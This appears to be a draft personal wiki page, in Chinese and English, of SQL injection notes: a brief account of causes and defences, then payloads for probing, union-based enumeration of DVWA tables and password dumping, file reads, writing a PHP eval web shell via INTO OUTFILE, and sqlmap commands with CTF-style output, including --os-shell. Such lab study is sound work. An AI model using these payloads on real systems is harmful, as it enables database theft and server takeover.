---
title: "Sql Inject"
draft: true
sidebar: false
outline: 2
---

# Sql Inject

[databases](../cyber/WebApplication.md#database)

[SQL Injection](../security/webpentesting.md#sql-injection)

[Advanced SQL Injection](../webapp/InjectionAttacks.md#advanced-sql-injection)

SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：

1. 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
2. 使用参数化（Parameterized Query 或 Parameterized Statement）；
3. 还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!

## common

**注释**
```sql
#
```
`或者打空格`
```sql
--+ 
```
<span style="font-size: 23px;">**payload**</span>

`where id = '$id'`
```sql
' or '1' = '1
```
```sql
' or 1=1 #
```

**URL encoding**

`1' OR 1=1 -- `   →   `1%27%20||%201=1%20--+`   →   `1%27%20%7C%7C%201%3D1%20%2D%2D+`

- `%27` is the URL encoding for the single quote (').
- `%20` is the URL encoding for a space ( ).
- `||` represents the SQL OR operator. `%7C%7C` is the URL encoding for `||`. 
- `%3D` is the URL encoding for the equals sign (=).
- `%2D%2D` is the URL encoding for --, which starts a comment in SQL.
- `+` add a space after the comment, ensuring that the comment is properly terminated and there are no syntax issues.

[ASCII](../linux/encoding.md#ascii)

**判断是否为注入点**

`where id = '$id'`
```sql
1' and '1'='1
```
```sql
1' and 1=1 --+
```
**判断查询字段数目**

```sql
1' order by 3 --+
```

**确定回显字段**

```sql
1' union select 1,2,3 limit 1,1 --+
```

```sql
' union select 1,2,3 --+
```
## union注入

**union联合查询**
- 可以一次性执行两个或多个查询，并将它们的结果组合在一起输出。
- 所有查询中的**列数必须相同**，以第一个查询为准。

[information_schema元数据库](../cyber/WebApplication.md#information-schema)

*查询数据库*
```sql
' union select 1,group_concat(schema_name) from information_schema.schemata #
```
*查询当前操作的数据库*
```sql
' union select 1,database() #
```
*查询指定数据库的表*
```sql
' union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'dvwa' #
```
*查询指定表的字段*
```sql
' union select 1,group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users' #
```
*查看数据*
```sql
' union select 1,group_concat(username,':',password SEPARATOR '<br>') from dvwa.users #
```
<span style="font-size: 23px;">**通过SQL注入向靶机中读取写入**</span>

[通过MySQL读写文件](../cyber/WebApplication.md#通过mysql读写文件)

*读取*
```bash
' union select 1,load_file('/flag.txt'),3 #
```

*写入*
- 必须要保证mysql用户对指定目录具有写入权限
- 文件路径必须用绝对路径
```bash
' union select 1,"<?php @eval($_REQUEST['pass']);?>",3 into outfile '/var/www/html/uploads/shell.php' #
```
---

## sqlmap

[sqlmap](../security/offensivetools.md#sqlmap)

自动化注入工具sqlmap
- sqlmap利用Python开发，运行sqlmap需要有Python环境，推荐在Kali中使用。

注释符 `--+`
- 注释符 `#` 在URL中需要编码为 `%23`
- 在URL中通常使用 `--+` 来代替`#`，`+`是空格的URL编码。

<span style="font-size: 23px;">**基本用法**</span>

```bash
# 检测注入点
sqlmap -u "http://xxx?id=1"

# 查询所有数据库
sqlmap -u "http://xxx?id=1" --dbs
available databases [4]:
[*] information_schema
[*] mysql
[*] note
[*] performance_schema

# 查询当前操作的数据库
sqlmap -u "http://xxx?id=1" --current-db
current database: 'note'

# 查询指定数据库的表 -D 数据库名
sqlmap -u "http://xxx?id=1" --tables -D note
[2 tables]
+-------+
| fl4g  |
| notes |
+-------+

# 查询指定表的字段 -T 表名
sqlmap -u "http://xxx?id=1" --columns -T fl4g -D note
+---------+-------------+
| Column  | Type        |
+---------+-------------+
| fllllag | varchar(40) |
+---------+-------------+

# 导出数据 --dump ; -C 字段名
sqlmap -u "http://xxx?id=1" --dump -C fllllag -T fl4g -D note
+---------------------------------+
| fllllag                         |
+---------------------------------+
| n1book{union_select_is_so_cool} |
+---------------------------------+
```

**可选操作**

```bash
# 判断当前用户是否为数据库管理员
sqlmap -u "http://xxx?id=1" --is-dba
current user is DBA: True

# 获取当前用户
sqlmap -u "http://xxx?id=1" --current-user
current user: 'root@localhost'
```
---

<span style="font-size: 23px;">**sqlmap指定User-Agent**</span>

通过指定User-Agent绕过服务器限制
- `-A` **AGENT** 指定User-Agent
- `--random-agent` 使用随机User-Agent
- `--mobile` Imitate(模仿) smartphone through HTTP User-Agent header

```bash
sqlmap -u "http://xxx" --random-agent
```
<span style="font-size: 23px;">**sqlmap加载cookie**</span>

- 通过`--cookie`=COOKIE 选项加载**cookie**，可以用于需要身份验证情况下的注入。

[cookie](../cyber/web.md#cookies)

```bash
sqlmap -u "http://xxx" --cookie="COOKIE"
```
---

<span style="font-size: 23px;">**post型注入**</span>

- 通过`--data`选项指定post方法传递的数据

```bash
sqlmap -u "http://xxx/index.php" --data="id=1"
```
- 通过`-r`选项加载HTTP请求文件，用`-p`选项指定要检测的参数。

```bash
sqlmap -r "post.txt" -p "id"
```
---

<span style="font-size: 23px;">**通过sqlmap获取Shel**</span>

- 需要知道网站的主目录，且有一个具有 **写** 权限的目录

```bash
sqlmap -r "post.txt" --os-shell
```


